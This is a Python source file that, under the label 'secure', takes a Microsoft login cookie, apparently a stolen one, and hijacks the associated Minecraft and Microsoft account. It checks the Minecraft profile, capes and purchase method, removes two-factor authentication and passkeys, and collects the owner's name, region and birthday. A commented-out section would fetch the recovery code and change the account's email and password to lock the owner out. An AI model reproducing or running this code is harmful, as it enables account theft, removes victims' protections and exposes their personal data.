from views.utils.securing.securityInformation import securityInformation
from views.utils.securing.recoveryCodeSecure import recoveryCodeSecure
from views.utils.securing.getRecoveryCode import getRecoveryCode
from views.utils.securing.getAccountInfo import getAccountInfo
from views.utils.securing.removeServices import removeServices
from views.utils.securing.generateEmail import generateEmail
from views.utils.securing.removeProof import removeProof
from views.utils.securing.getCookies import getCookies
from views.utils.securing.polishHost import polishHost
from views.utils.securing.getProfile import getProfile
from views.utils.securing.removeZyger import removeZyger
from views.utils.securing.remove2FA import remove2FA
from views.utils.minecraft.getMethod import getMethod
from views.utils.minecraft.getCapes import getCapes
from views.utils.securing.getAMRP import getAMRP
from views.utils.securing.getSSID import getSSID
from views.utils.securing.getXBL import getXBL
from views.utils.securing.getT import getT
import secrets
import json

def secure(msaauth: str):
    
    mailslurp_key = json.load(open("config.json", "r+"))["tokens"]["mailslurp_key"]

    accountInfo = {
        "oldName": "Failed to Get",
        "newName": "Couldn't Change!",
        "oldEmail": "Couldn't Find",
        "email": "Couldn't Change!",
        "secEmail": "Couldn't Change!",
        "password": "Couldn't Change!",
        "recoveryCode": "Couldn't Change!",
        "loginCookie": msaauth,
        "status": "Unknown",
        "timeTaken": 0,
        "SSID": "Failed to Get",
        "firstName": "Failed to Get",
        "lastName": "Failed to Get",
        "fullName": "Failed to Get",
        "region": "Failed to Get",
        "birthday": "Failed to Get",
        "method": "Unknown",
        "capes": []
    }
    
    cookies = getCookies() # [canary, apicanary, amsc]
    print("[+] - Got Cookies! Polishing login cookie...")
    host = polishHost(msaauth, cookies[2])
    if host == "Locked":
        accountInfo["email"] = "Locked"
        accountInfo["secEmail"] = "Locked"
        accountInfo["recoveryCode"] = "Locked"
        accountInfo["password"] = "Locked"
        accountInfo["status"] = "Locked"

        return accountInfo

    if host == "Down":
        accountInfo["email"] = "Microsoft Down"
        accountInfo["secEmail"] = "Microsoft Down"
        accountInfo["recoveryCode"] = "Microsoft Down"
        accountInfo["password"] = "Microsoft Down"
        accountInfo["status"] = "Microsoft Down"

        return accountInfo
    
    # Minecraft checking
    print("[~] - Checking Minecraft Account")
    XBLResponse = getXBL(host)

    if XBLResponse:
        print("[+] - Got XBL (Has Xbox Profile)")

        # XBL && Token
        xbl = XBLResponse["xbl"]
        ssid =  getSSID(xbl)
        
        # Get capes, profile and purchase method
        if ssid:
            print("[+] - Got SSID! (Has Minecraft)")
            accountInfo["SSID"] = ssid

            capes = getCapes(ssid)
            if capes:
                accountInfo["capes"] = ", ".join(i["alias"] for i in capes)
                print(f"[+] - Got capes")
            else:
                accountInfo["capes"] = "No Capes"

            profile = getProfile(ssid)
            if not profile:
                accountInfo["oldName"] = "No Minecraft"
                print("[x] - Failed to get profile")
            else:
                print(f"[+] - Got profile")
                accountInfo["oldName"] = profile

            method = getMethod(ssid)
            if method:
                accountInfo["method"] = method
                print(f"[+] - Got purchase method")
        else:
            print("[x] - Failed to get SSID")

    else:
        print("[x] - Failed to get XBL")
        accountInfo["oldName"] = "No Minecraft"

    T = getT(msaauth, cookies[2])
    if T == "Locked":
        accountInfo["email"] = "Locked"
        accountInfo["secEmail"] = "Locked"
        accountInfo["recoveryCode"] = "Locked"
        accountInfo["password"] = "Locked"
        accountInfo["status"] = "Locked"

        return accountInfo

    elif T == "Down":
        accountInfo["email"] = "Microsoft Down"
        accountInfo["secEmail"] = "Microsoft Down"
        accountInfo["recoveryCode"] = "Microsoft Down"
        accountInfo["password"] = "Microsoft Down"
        accountInfo["status"] = "Microsoft Down"

        return accountInfo

    # Security Steps

    if T:
        print("[+] - Found T")
        amrp = getAMRP(T, cookies[2])

        if amrp:
            
            print("[+] - Got AMRP")
            proofsID = "CVaPoMdMAFIqPI8qEUwE8ToVCln9BkJXDVkqlCKu3bd7IUkO4mArxDAa2uUFLSc1WRoWPAHx/UlJieOCBfrVVJ1MZypXSCrKQMD7RVCSqYD15CyzBX/xYyhHLPqqWZqc3P/0ARc9DlbR6C7L5u8ppayQwAc3byXJvMN6T8Er2z3/irB6VR57bZ7U2LgkPZlyF87qaJMfREW37sOjGNtxAup6pByaHaIn50efH9X/6REGB/Qp6o9NAIuLHZcRXsHajkB5Sg6uNpnPQ:=:2:3"

            # 2FA
            remove2FA(amrp, cookies[1], cookies[2])

            # Pass Keys
            removeZyger(amrp, cookies[1], cookies[2])

            # To be fixed ###########################################
            #                                                       #
            # removeProof(amrp, cookies[1], cookies[2], proofsID)   #                                            
            # removeServices(amrp, cookies[2], cookies[0])          #
            #                                                       #
            #########################################################

            accountMSInfo = getAccountInfo(amrp, cookies[2])

            accountInfo["firstName"] = accountMSInfo["firstName"]
            accountInfo["lastName"] = accountMSInfo["lastName"]
            accountInfo["fullName"] = accountMSInfo["fullName"]
            accountInfo["region"] = accountMSInfo["region"]
            accountInfo["birthday"] = accountMSInfo["birthday"]
            print("[+] -  Got Account Information")

            # securityParameters = json.loads(securityInformation(amrp))
            # print("[+] - Got Security Parameters")

            # if securityParameters:

            #     email = securityParameters["email"]
            #     encryptedNetID = securityParameters["WLXAccount"]["manageProofs"]["encryptedNetId"] 

            #     accountInfo["oldEmail"] = email
                
            #     recoveryCode = getRecoveryCode(
            #         amrp,
            #         cookies[1],
            #         cookies[2],
            #         encryptedNetID
            #     )
            #     print("[+] - Got Recovery Code")

            #     new_email = generateEmail(mailslurp_key)
            #     print(f"[+] - Generated Email ({new_email})")

            #     new_password = secrets.token_urlsafe(13)
            #     print(f"[+] - Generated Password ({new_password})")

            #     print("[~] - Automaticly Securing Account...")
            #     newData = recoveryCodeSecure(email, recoveryCode, new_email, new_password, mailslurp_key) 
                
            #     if newData:
                    
            #         accountInfo["secEmail"] = new_email
            #         accountInfo["recoveryCode"] = newData[0]
            #         accountInfo["password"] = newData[1]

            #     print("[+] - Account has been secured")

    return accountInfo


            

    

    
        

        